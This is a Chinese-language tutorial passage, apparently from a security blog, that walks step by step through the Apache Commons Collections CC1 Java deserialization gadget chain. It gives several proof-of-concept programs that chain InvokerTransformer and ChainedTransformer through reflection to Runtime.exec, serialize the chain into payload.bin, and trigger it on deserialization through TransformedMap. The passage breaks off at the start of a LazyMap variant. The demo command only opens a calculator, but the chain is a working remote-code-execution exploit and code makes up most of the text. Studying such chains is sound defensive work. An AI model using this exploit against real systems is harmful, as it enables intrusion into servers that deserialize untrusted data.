<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简化一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看一下对应的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;open -a calculator&quot;</span></span><br></pre></td></tr></table></figure>





<p>通过函数调用POC就为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.xjc.reader.xmlschema.BindPurple;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line"><span class="comment"> * this.iMethodName=&quot;exec&quot;</span></span><br><span class="line"><span class="comment"> * this.iParamTypes=String.class</span></span><br><span class="line"><span class="comment"> * this.iArgs=&quot;open -a calculator&quot;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment"> *         this.iMethodName = methodName;</span></span><br><span class="line"><span class="comment"> *         this.iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment"> *         this.iArgs = args;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        invokertransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="3-2-同一个函数中进行序列化"><a href="#3-2-同一个函数中进行序列化" class="headerlink" title="3.2 同一个函数中进行序列化"></a>3.2 同一个函数中进行序列化</h3><p>使用文件写入，代替网络传输</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将invokertransformer作为文件输入流输出为payload.bin</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutput objectOutput = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutput.writeObject(invokertransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从payload.bin读取invokertransformer</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer payloadInput = (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payloadInput.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="3-3-网络传输时"><a href="#3-3-网络传输时" class="headerlink" title="3.3 网络传输时"></a>3.3 网络传输时</h3><p>ChainedTransformer类中，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p>
<p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过创建一个ChainedTransformer对象来控制iTransformers数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>



<p>那我们就把payload封装成Transformer[]。然后作为构造函数的参数创建一个ChainedTransformer对象</p>
<p>首先Transformer是一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们封装payload的时候就要转换成Transformer的实现类。</p>
<p>InvokerTransformer 继承了Transformer 和 Serializable</p>
<p>ConstantTransformer也继承了Transformer</p>
<p>这里用InvokerTransformer来改造poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//客户端poc</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//服务端poc</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        transformerChain.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述poc有个问题就是服务端需要我们创建一个Runtime对象，我们不可能控制服务端。所以我们需要在数组中进行串行调用。</p>
<p>先获取Runtime对象，再通过Runtime对象执行方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如果我们反序列化呢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//new ConstantTransformer(Runtime.getRuntime()),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是会失败的，因为Runtime类没有继承Serializable，无法在服务端反序列化成功。</p>
<p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<span class="comment">//得到Runtime class</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>最终的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC0</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//1. 获取Runtime Class</span></span><br><span class="line">                <span class="comment">//new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;))</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h3 id="3-4-TransformedMap"><a href="#3-4-TransformedMap" class="headerlink" title="3.4 TransformedMap"></a>3.4 TransformedMap</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PocMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">        <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">        Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">        <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">        <span class="comment">//outerMap_now.put(&quot;123&quot;, &quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="4-LazyMap版本"><a href="#4-LazyMap版本" class="headerlink" title="4. LazyMap版本"></a>4. LazyMap版本</h2><p>jdk 8u72一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoclazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] 